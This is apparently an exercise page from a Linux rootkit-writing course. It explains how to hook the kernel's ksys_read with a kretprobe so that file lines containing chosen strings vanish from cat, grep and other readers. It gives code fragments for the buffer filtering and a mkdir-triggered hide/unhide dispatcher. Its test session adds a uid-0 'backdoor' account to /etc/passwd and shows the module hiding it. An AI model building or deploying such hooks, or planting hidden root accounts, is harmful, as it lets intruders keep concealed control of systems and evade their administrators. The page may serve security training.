# L12: Content Line Filter

L11 hides files and PIDs from directory listings.
This exercise hides text lines from file reads.
If you add a backdoor user to `/etc/passwd`, this filter makes the line
invisible to `cat`, `grep`, and every tool that reads through `read(2)`.

Same pattern as L11: intercept the return path, copy the buffer into kernel
space, remove matching entries, write the modified buffer back.
But the data format is different (text lines, not dirent records) and the hook
target has a critical difference.

## The hook: ksys_read

Every `cat`, `grep`, `less` eventually calls `read(fd, buf, count)`.
The kernel implements this through `ksys_read`.

```text
  cat /etc/passwd
    |
    v
  read(fd, buf, count)
    |
    v
  ksys_read                    <-- kretprobe
    |
  entry: save buf (regs->si), count (regs->dx)
    |
  kernel fills buf with file data
    |
  return: copy_from_user(kbuf, buf, total)
         walk lines (memchr '\n')
         strnstr match against targets
         memmove out matching lines
         copy_to_user(buf, kbuf, new_total)
         regs_set_return_value(regs, new_total)
```

## The trap

`ksys_read` is a **regular kernel function**, not a syscall wrapper.
Its arguments are directly in the registers:

```c
// CORRECT: direct register access
data->ubuf = (void __user *)regs->si;
data->count = (size_t)regs->dx;
```

L11's `__x64_sys_getdents64` is a syscall wrapper that wraps its arguments in
inner pt_regs (double indirection).
`ksys_read` does not.
If you use `regs_get_kernel_argument` here, you dereference garbage.

This is the #1 gotcha in the course.
Knowing which functions are syscall wrappers (need inner pt_regs) and which are
regular functions (direct register access) is essential.

## Line walking

Text lines have no length field like dirent's `d_reclen`.
Find each line boundary with `memchr` looking for `'\n'`:

```c
char *nl = memchr(pos, '\n', remaining);
int line_len = nl ? (nl - pos + 1) : remaining;
```

Matching uses `strnstr` (length-bounded substring search), not `strcmp`.
Hiding "backdoor" removes any line *containing* "backdoor", not just lines that
are exactly "backdoor".

## You write

`main.c`, ~300 lines:

- `struct rk_read_data` for kretprobe instance data (ubuf, count)
- `rk_read_entry()`: save buf from `regs->si`, count from `regs->dx`
- `rk_read_return()`: copy, walk lines, filter matches, write back
- `line_matches()`: `strnstr` search against content_targets
- mkdir dispatcher for `h.c`/`u.c` commands
- One target list: `content_targets`

## API

```c
#include <linux/kprobes.h>
#include <linux/string.h>      // strnstr, memchr

// ksys_read: regular function, direct register access
data->ubuf = (void __user *)regs->si;
data->count = (size_t)regs->dx;

// Line boundary detection
char *nl = memchr(pos, '\n', (kbuf + new_total) - pos);
int line_len = nl ? (nl - pos + 1) : ((kbuf + new_total) - pos);

// Substring match (length-bounded)
strnstr(line, target, line_len);
```

## Test it

The module is pre-loaded.
You are logged in as student.

```
$ echo "backdoor:x:0:0::/root:/bin/bash" >> /etc/passwd
$ cat /etc/passwd | grep backdoor
backdoor:x:0:0::/root:/bin/bash
$ mkdir rklings.h.c.backdoor
$ cat /etc/passwd | grep backdoor
(no output)
$ mkdir rklings.u.c.0
$ cat /etc/passwd | grep backdoor
backdoor:x:0:0::/root:/bin/bash
```

## Validate

```
$ rklings validate l12
  [+] module loaded
  [+] target string hidden from cat
  [+] hidden line still in file (wc -l unchanged)
  [+] unhide restores line in output
  PASS
```

## Next

L13 hides TCP ports from ss and netstat using a different technique: seq_file
count rewind instead of buffer copying.
